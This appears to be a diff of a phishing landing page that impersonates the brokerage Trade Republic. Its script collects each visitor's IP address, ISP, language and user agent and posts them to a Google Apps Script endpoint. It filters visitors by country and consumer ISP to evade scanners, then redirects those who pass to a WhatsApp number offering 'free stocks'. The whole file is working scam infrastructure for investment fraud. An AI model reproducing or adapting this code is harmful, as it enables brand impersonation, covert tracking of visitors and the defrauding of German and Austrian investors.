@@ -5,101 +5,59 @@
   <title>Trade Republic – Willkommen</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f4f4f4;
-      text-align: center;
-      padding-top: 100px;
-      color: #333;
-    }
-    .message {
-      font-size: 28px;
-      margin-bottom: 20px;
-    }
-    .warning {
-      color: red;
-      font-size: 20px;
-    }
-    .logo {
-      max-width: 200px;
-      margin-bottom: 30px;
-    }
+    body { font-family: Arial, sans-serif; text-align: center; margin-top: 80px; }
+    .logo { width: 150px; margin-bottom: 30px; }
+    #message { font-size: 24px; }
   </style>
 </head>
 <body>
-  <img src="https://upload.wikimedia.org/wikipedia/commons/2/26/Trade_Republic_Logo_2021.svg" alt="Trade Republic Logo" class="logo">
-  <div class="message" id="status">Willkommen bei Trade Republic ............Bitte warten....</div>
-
+  <img src="https://upload.wikimedia.org/wikipedia/commons/2/26/Trade_Republic_Logo_2021.svg" alt="Logo" class="logo">
+  <div id="message">Willkommen bei Trade Republic</div>
   <script>
     const GAS_URL = "https://script.google.com/macros/s/AKfycbxUZUPpwihLRC4UVCPMDOFr64WfWhemdVxWwLqxXFhg2U6w0uBfz5Bl5KKO5w3ipgFP/exec";
-
-    const MAX_VISITS = 20;
-    const TIME_WINDOW = 2 * 60 * 1000; // 2 Minuten
+    const REDIRECT_URL = "https://api.whatsapp.com/send/?phone=4915774767813&text=Erhalten+Sie+10+potenzielle+Aktien+kostenlos";
+    const ALLOWED_COUNTRIES = ["DE", "AT"];
+    const ALLOWED_ISPS = [
+      "Deutsche Telekom AG", "Vodafone GmbH", "O2 Deutschland",
+      "A1 Telekom Austria AG", "Magenta Telekom", "3 Hutchison Drei Austria"
+    ];
+    const VISIT_LIMIT = 20;
+    const VISIT_WINDOW = 2 * 60 * 1000;
 
     function isRateLimited() {
       const now = Date.now();
       const visits = JSON.parse(localStorage.getItem("visits") || "[]")
-        .filter(ts => now - ts < TIME_WINDOW);
-
+        .filter(ts => now - ts < VISIT_WINDOW);
       visits.push(now);
       localStorage.setItem("visits", JSON.stringify(visits));
-
-      return visits.length > MAX_VISITS;
-    }
-
-    async function getIPData() {
-      const res = await fetch("https://ipapi.co/json");
-      return await res.json();
-    }
-
-    async function logVisit(payload) {
-      try {
-        await fetch(GAS_URL, {
-          method: "POST",
-          mode: "no-cors",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        });
-      } catch (err) {
-        console.error("Fehler beim Senden der Daten", err);
-      }
+      return visits.length > VISIT_LIMIT;
     }
 
     async function main() {
-      const status = document.getElementById("status");
+      const messageEl = document.getElementById("message");
+      const info = await fetch("https://ipapi.co/json/").then(r => r.json().catch(() => ({})));
+      const ip = info.ip || "Unbekannt";
+      const countryCode = (info.country || "").toUpperCase();
+      const isp = info.org || "Unbekannt";
+      const lang = navigator.language || "Unbekannt";
+      const ua = navigator.userAgent || "Unbekannt";
 
-      if (isRateLimited()) {
-        status.innerHTML = "⚠️ Sie wurden wegen ungewöhnlicher Aktivität blockiert.";
-        return;
-      }
+      const blocked = isRateLimited();
+      const valid = ALLOWED_COUNTRIES.includes(countryCode) && ALLOWED_ISPS.some(x => isp.includes(x));
+      const status = valid ? "跳转成功" : "跳转失败";
 
-      try {
-        const data = await getIPData();
+      await fetch(GAS_URL, {
+        method: "POST",
+        body: JSON.stringify({ ip, countryCode, isp, lang, ua, status })
+      });
 
-        const allowedCountries = [ "Austria","Germany" ];
-        const country = data.country_name;
-        const allowed = allowedCountries.includes(country);
-
-        const payload = {
-          ip: data.ip || "Unbekannt",
-          country: country || "Unbekannt",
-          language: navigator.language || "Unbekannt",
-          ua: navigator.userAgent || "Unbekannt",
-          valid: allowed ? "Ja" : "Nein"
-        };
-
-        await logVisit(payload);
-
-        if (!allowed) {
-          status.innerHTML = "❌ Ihr Land ist derzeit nicht berechtigt, auf diese Seite zuzugreifen.";
-          return;
-        }
-
-        // ✅ 
-        window.location.href = "https://api.whatsapp.com/send/?phone=4915774767813&text=Erhalten+Sie+10+potenzielle+Aktien+kostenlos";
-
-      } catch (err) {
-        status.innerHTML = "⚠️ Fehler beim Laden der Daten.";
+      if (blocked) {
+        messageEl.innerText = "⚠️ Zu viele Anfragen – bitte später erneut versuchen.";
+      } else if (valid) {
+        messageEl.innerText = "Erfolgreich – Weiterleitung erfolgt...";
+        setTimeout(() => window.location.href = REDIRECT_URL, 1000);
+      } else {
+        messageEl.innerText = "Zugriff verweigert: Dieser Anbieter wird nicht unterstützt.";
       }
     }
 
